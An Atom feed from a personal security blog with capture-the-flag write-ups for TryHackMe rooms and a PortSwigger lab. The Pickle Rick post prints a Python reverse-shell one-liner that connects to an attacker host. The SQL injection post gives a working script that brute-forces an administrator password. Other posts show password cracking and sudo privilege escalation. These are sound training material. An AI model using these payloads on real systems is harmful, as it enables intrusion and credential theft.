<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2021-01-06T22:52:56+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Pickle Rick Write Up</title><link href="https://darrynbrownfield.co.uk/picklerick" rel="alternate" type="text/html" title="Pickle Rick Write Up" /><published>2021-01-06T00:00:00+00:00</published><updated>2021-01-06T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/picklerick</id><content type="html" xml:base="https://darrynbrownfield.co.uk/picklerick">&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/cover.png&quot; alt=&quot;picklerick&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/picklerick&quot;&gt;Pickle Rick&lt;/a&gt; is a easy room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. I enjoyed this room a lot, it was simple and requires good enumeration. The goal of this room is to:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I deployed the machine and was given the target IP 10.10.116.216. I started a NMAP scan to check the available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN initial 10.10.116.216
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-06 21:57 GMT
Nmap scan report for 10.10.116.216
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:4f:2b:62:18:c3:dd:2e:a2:2c:b5:12:24:12:d0:79 (RSA)
|   256 de:3b:e3:78:a0:61:ac:71:ee:75:a2:c7:ae:1b:26:40 (ECDSA)
|_  256 e4:b9:4e:ae:81:bf:32:9d:a6:22:c1:35:d4:92:bb:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;I started off by looking at the web server, going to http://10.10.116.216 presents the following page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing of great interest so I looked at the source.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;
&amp;lt;head&amp;gt;
  &amp;lt;title&amp;gt;Rick is sup4r cool&amp;lt;/title&amp;gt;
  &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
  &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;
  &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;assets/bootstrap.min.css&quot;&amp;gt;
  &amp;lt;script src=&quot;assets/jquery.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;script src=&quot;assets/bootstrap.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;style&amp;gt;
  .jumbotron {
    background-image: url(&quot;assets/rickandmorty.jpeg&quot;);
    background-size: cover;
    height: 340px;
  }
  &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

  &amp;lt;div class=&quot;container&quot;&amp;gt;
    &amp;lt;div class=&quot;jumbotron&quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;h1&amp;gt;Help Morty!&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;
    &amp;lt;p&amp;gt;Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!&amp;lt;/p&amp;gt;&amp;lt;/br&amp;gt;
    &amp;lt;p&amp;gt;I need you to &amp;lt;b&amp;gt;*BURRRP*&amp;lt;/b&amp;gt;....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the &amp;lt;b&amp;gt;*BURRRRRRRRP*&amp;lt;/b&amp;gt;, password was! Help Morty, Help!&amp;lt;/p&amp;gt;&amp;lt;/br&amp;gt;
  &amp;lt;/div&amp;gt;

  &amp;lt;!--

    Note to self, remember username!

    Username: R1c&amp;lt;REDACTED&amp;gt;

  --&amp;gt;

&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I will take a note of the username as will probably be required later on, nothing else seems to jump out at the moment on an initial glance. Although ‘Burp’ got me thinking maybe I need to send the request via burp suite and play with the request but if I get stuck I will come back to that. I did some basic web enumeration first by trying common things such as checking robots.txt.&lt;/p&gt;

&lt;p&gt;Robots.txt had a single word:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Wubbalu   « I have redacted part the output&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I could see from the source code a assets folder to I had a look at http://10.10.116.216/assets&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/assets.png&quot; alt=&quot;assets&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing else jumped out so I ran a gobuster.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.116.216 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.116.216
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/06 21:58:27 Starting gobuster
===============================================================
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2021/01/06 22:00:07 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nothing was found that I didn’t already know, so I ran a second gobuster however this time I included some common extensions.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.116.216 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,php,log,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.116.216
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,log,txt
[+] Timeout:        10s
===============================================================
2021/01/06 22:00:46 Starting gobuster
===============================================================
/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
/index.html (Status: 200)
/robots.txt (Status: 200)
/denied.php (Status: 302)
/server-status (Status: 403)
/clue.txt (Status: 200)
===============================================================
2021/01/06 22:16:54 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;login.php and clue.txt look interesting, going to http://10.10.116.216/clue.txt provides:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Look around the file system for the other ingredient.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Not really much of a clue so I looked at login.php&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After trying some common default credentials I was able to log in with the username found in the source code and the word found in robots.txt.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/command.png&quot; alt=&quot;command&quot; /&gt;&lt;/p&gt;

&lt;p&gt;All the links expect ‘Commands’ directs to http://10.10.116.216/denied.php so I tried some basic command such as ls, id, pwd, whoami and they all work.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/ls.png&quot; alt=&quot;ls&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However when I try and cat Sup3rS3cretPickl3Ingred.txt I get an error.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/commanddisabled.png&quot; alt=&quot;commanddisabled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fortunately I can just web browse directly to the file http://10.10.116.216/Sup3rS3cretPickl3Ingred.txt, 1 down 2 to go.&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;I want to get a shell on the box, so I checked for python or python3.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/python3.png&quot; alt=&quot;python3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Great I can use python3 to get a reverse shell assuming the commands not blocked. Using the following command I get a shell!&lt;/p&gt;

&lt;p&gt;/usr/bin/python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“&lt;REDACTED&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/REDACTED&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [&amp;lt;REDACTED&amp;gt;] from (UNKNOWN) [10.10.116.216] 37984
/bin/sh: 0: can't access tty; job control turned off
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;Although I need to search for the other 2 ingredients. I wanted to escalate my privilages, I checked ‘sudo -l’ and I can run any sudo command with out a password so I do a simple ‘sudo su’ to become root.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-116-216.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-116-216.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
$ sudo su
id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now its just a case of finding the ingredient files which can be found in /home/rick and /root.&lt;/p&gt;

&lt;p&gt;Thats the box, thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry><entry><title type="html">Blind SQL injection with conditional responses script</title><link href="https://darrynbrownfield.co.uk/blindsqli" rel="alternate" type="text/html" title="Blind SQL injection with conditional responses script" /><published>2021-01-02T00:00:00+00:00</published><updated>2021-01-02T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/blindsqli</id><content type="html" xml:base="https://darrynbrownfield.co.uk/blindsqli">&lt;p&gt;&lt;img src=&quot;/assets/images/websecacademy/blindsql/cover.jpeg&quot; alt=&quot;blindsql&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;This post is to provide the script I created to automate the process of using blind SQL injection with conditional responses to brute force a password. This was completed for a lab while completing the SQL Injection topic on &lt;a href=&quot;https://portswigger.net/web-security&quot;&gt;WebSecurity Academy&lt;/a&gt;. I can’t recommend this training enough, the content is well written and the labs are great and best of all its free!&lt;/p&gt;

&lt;p&gt;As part of the lab I completed process in 3 ways, manually using Burp repeater, using Burp intruder and finally by writing this Python script. I still learning Python and this was a good exercise to do more Python coding and also reenforce the learning.&lt;/p&gt;

&lt;h3 id=&quot;final-script&quot;&gt;Final Script&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# 02/01/21
# blind-sql-lab.py
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# POC script to automate getting the administrator password using blind sql conditional responses

import requests
import string

url = &quot;&quot; # Insert URL here!

cookievalue = &quot;&quot;
password = &quot;&quot;

cookies = {'TrackingId':cookievalue}

characters = list(string.ascii_lowercase)
characters = characters + list(string.digits)

for i in range(1,21):
    for char in characters:
        cookievalue = &quot;x'+UNION SELECT+'a' FROM users WHERE username='administrator' AND substring(password,{},1)='{}'--&quot;.format(i,char)
        cookies = {'TrackingId':cookievalue}
        r = requests.get(url, cookies=cookies)
        response = r.text
        if &quot;Welcome back!&quot; in response:
            print(char)
            password = password + char
            
print(&quot;Password is: &quot; + password)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;next-steps&quot;&gt;Next Steps&lt;/h3&gt;

&lt;p&gt;The script could be a lot better, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Initial check to test the website is up&lt;/li&gt;
  &lt;li&gt;Run a test conditional check to test for SQL injection&lt;/li&gt;
  &lt;li&gt;Automate the process of finding the password length and pass to the range function&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="websecurityacademy" /><category term="sqli" /><category term="python" /><summary type="html"></summary></entry><entry><title type="html">Brooklyn Nine Nine Write Up</title><link href="https://darrynbrownfield.co.uk/brooklynninenine" rel="alternate" type="text/html" title="Brooklyn Nine Nine Write Up" /><published>2021-01-01T00:00:00+00:00</published><updated>2021-01-01T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/brooklynninenine</id><content type="html" xml:base="https://darrynbrownfield.co.uk/brooklynninenine">&lt;p&gt;&lt;img src=&quot;/assets/images/brooklynninenine/cover.png&quot; alt=&quot;brooklynninenine&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/brooklynninenine&quot;&gt;Brooklyn Nine Nine&lt;/a&gt; is a easy room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; by Fsociety2006.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I deployed the machine and was given the target IP 10.10.130.161. I started a NMAP scan to check the available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN initial 10.10.130.161
[sudo] password for daz: 
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-01 14:26 GMT
Nmap scan report for 10.10.130.161
Host is up (0.070s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;21 - FTP - Anonymous log in allowed with a note&lt;/li&gt;
  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache web server version 2.4.29&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;As the FTP service allows anonymous access I started by logging in with the username ‘anonymous’ and the password ‘anonymous’.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ftp 10.10.130.161
Connected to 10.10.130.161.
220 (vsFTPd 3.0.3)
Name (10.10.130.161:daz): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp&amp;gt; get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.03 secs (4.3601 kB/s)
ftp&amp;gt; ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I downloaded the note_to_jake.txt file but couldn’t find anything else. The note reads:&lt;/p&gt;
&lt;blockquote&gt;

  &lt;p&gt;From Amy,&lt;/p&gt;

  &lt;p&gt;Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;The note indicates a weak password being used, I moved on to port 80 and looked at the web page.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;
&amp;lt;style&amp;gt;
body, html {
  height: 100%;
  margin: 0;
}

.bg {
  /* The image used */
  background-image: url(&quot;brooklyn99.jpg&quot;);

  /* Full height */
  height: 100%; 

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
&amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

&amp;lt;div class=&quot;bg&quot;&amp;gt;&amp;lt;/div&amp;gt;

&amp;lt;p&amp;gt;This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.&amp;lt;/p&amp;gt;
&amp;lt;!-- Have you ever heard of steganography? --&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The page just displays an image of Brooklyn nine nine, however looking at the source provides a comment regarding steganography.&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;I downloaded the image and ran steghide however the I cant extract the data with out a password. I used &lt;a href=&quot;https://github.com/RickdeJager/stegseek&quot;&gt;StegSeek&lt;/a&gt; and the rockyou.txt word list to crack the password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
StegSeek version 0.5
Progress: 0.00% (0 bytes)           

[i] --&amp;gt; Found passphrase: &quot;&amp;lt;REDACTED&amp;gt;&quot;
[i] Original filename: &quot;note.txt&quot;
[i] Extracting to &quot;brooklyn99.jpg.out&quot;
┌─[daz@parrot]─[~/Documents/TryHackMe/Brooklyn99]
└──╼ $cat brooklyn99.jpg.out
Holts Password:
flu&amp;lt;REDACTED&amp;gt;

Enjoy!!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great I now have some credentials. Using the credentials I can now SSH in to the machine.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh holt@10.10.130.161
holt@10.10.130.161's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ 
holt@brookly_nine_nine:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;The privilege escalation was really simple, doing a sudo -l, all users can run /bin/nano without a password. Going to &lt;a href=&quot;https://gtfobins.github.io&quot;&gt;GTFOBins&lt;/a&gt; shows the steps required to abuse this and get root.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Following the steps, I get a root shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
brookly_nine_nine
# cd /root
# ls
root.txt
#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry><entry><title type="html">CC: Pentesting Write Up</title><link href="https://darrynbrownfield.co.uk/ccpentesting" rel="alternate" type="text/html" title="CC: Pentesting Write Up" /><published>2020-12-08T00:00:00+00:00</published><updated>2020-12-08T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/ccpentesting</id><content type="html" xml:base="https://darrynbrownfield.co.uk/ccpentesting">&lt;p&gt;&lt;img src=&quot;/assets/images/ccpentesting/cover.png&quot; alt=&quot;CCPentesting&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/ccpentesting&quot;&gt;CC:Pen Testing&lt;/a&gt; is a guided room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; providing an introduction to some of the common penetration testing tools. Its really well layed out and I recommend to anyone starting out in penetration testing or CTF challenges. This write up will only cover the steps for the final exam.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;As normal, I kicked off a nmap scan to see what ports are available.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA initial 10.10.215.190
[sudo] password for daz: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-08 21:42 GMT
Nmap scan report for 10.10.215.190
Host is up (0.027s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12:96:a6:1e:81:73:ae:17:4c:e1:7c:63:78:3c:71:1c (RSA)
|   256 6d:9c:f2:07:11:d2:aa:19:99:90:bb:ec:6b:a1:53:77 (ECDSA)
|_  256 0e:a5:fa:ce:f2:ad:e6:fa:99:f3:92:5f:87:bb:ba:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;The web page displays the basic apache page, I checked the source code but everything was standard. I kicked off a gobuster to see what other directories were available.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.215.190 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.215.190
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/08 21:49:12 Starting gobuster
===============================================================
/secret (Status: 301)
/server-status (Status: 403)
===============================================================
2020/12/08 21:51:09 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One directory found ‘/secret’, going to secret doesn’t display anything. I ran a second gobuster but this time in the secret folder and checked for .log, .txt and .html using the -x flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.215.190/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x log,txt,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.215.190/secret
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     log,txt,html
[+] Timeout:        10s
===============================================================
2020/12/08 21:55:16 Starting gobuster
===============================================================
/index.html (Status: 200)
/secret.txt (Status: 200)
Progress: 49450 / 220561 (22.42%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/12/08 21:59:31 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;1 additional file found, secret.txt. Web browsing to http://10.10.215.190/secret/secret.txt I could see the contents of the file:&lt;/p&gt;

&lt;p&gt;nyan:046385855FC9580393853D8E(REDACTED)&lt;/p&gt;

&lt;p&gt;The password looks to be SHA1. I put the hash in to a file called hash.txt on my VM and ran hashcat with the command: hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt –force&lt;/p&gt;

&lt;p&gt;Hashcat was successfully able to crack the hash and I was able to SSH in to the machine.&lt;/p&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;Once connected via SSH I ran ‘sudo -l’, the user nyan is able to run the command /bin/su as root without providing a password. This provides a simple privesc by using the command: ‘sudo su’&lt;/p&gt;

&lt;p&gt;Other techniques like this can be found on &lt;a href=&quot;https://gtfobins.github.io&quot;&gt;gtfobins&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;nyan@ubuntu:~$ sudo -l
Matching Defaults entries for nyan on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su
nyan@ubuntu:~$
nyan@ubuntu:~$ sudo su
root@ubuntu:/home/nyan# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/home/nyan# 
&lt;/code&gt;&lt;/pre&gt;

